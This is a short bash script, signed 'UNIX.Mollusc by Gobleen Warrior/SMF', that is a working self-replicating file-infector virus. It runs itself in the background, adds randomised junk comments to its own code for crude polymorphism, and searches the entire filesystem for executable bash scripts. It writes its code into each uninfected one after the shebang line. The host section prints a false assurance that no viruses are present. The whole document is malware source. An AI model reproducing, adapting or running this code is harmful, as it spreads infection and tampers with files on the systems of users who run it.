#!/bin/bash
if [ "$1" = gw_inf ] ; then
get_rnd () {
a=`expr $(($RANDOM % $(($2 - $1)))) + $1`
RANDOM=$RANDOM
return $a }
our_length=42
RANDOM=$$
echo -n "`cat $0`" | grep -v '^#' | head -n $our_length > /tmp/..gw$$c
get_rnd 3 `expr $our_length / 2`
split -l $? /tmp/..gw$$c /tmp/..gw$$i
for eachpiece in /tmp/..gw$$i* ; do
get_rnd 15 50
symbols=$?
while [ $symbols -gt 0 ] ; do
get_rnd 32 126
comment=$comment`echo -e '\'$(printf %o $?)`
symbols=`expr $symbols - 1`
done
echo '# '$comment >> $eachpiece
comment=""
done
cat /tmp/..gw$$i* >> /tmp/..clear_gw
rm /tmp/..gw$$*
find / -type f -perm +111 -exec bash -c \
"if [ -z \"\`cat {} | grep mollusá\`\" ] ; then
if [ -n \"\`file {} | grep -s Bourne-Again\`\" ] ; then
if [ -n \"\`head -n 1 {} | grep -s !/bin/bash\`\" ] ; then
hs=\`head -n 1 {} | wc -c | awk '{print \$1}'\`
fs=\`wc -c {} | awk '{print \$1}'\`
ts=\`expr \$fs - \$hs\`
tail -c \$ts {} > '/tmp/..vic'\$$'_gw'
echo '#!/bin/bash' > {}
cat /tmp/..clear_gw >> {}
cat '/tmp/..vic'\$$'_gw' >> {}
rm /tmp/..vic*_gw
fi; fi; fi" \;
rm /tmp/..clear_gw
exit 0
else
$0 gw_inf &
fi
: UNIX.Mollusc by Gobleen Warrior/SMF
########################## HOST FILE GOES HERE ##############################
echo -----------------------------
echo "NOW WORKING HOST FILE...
THERE NO ANY VIRUSES HERE..."
echo -----------------------------
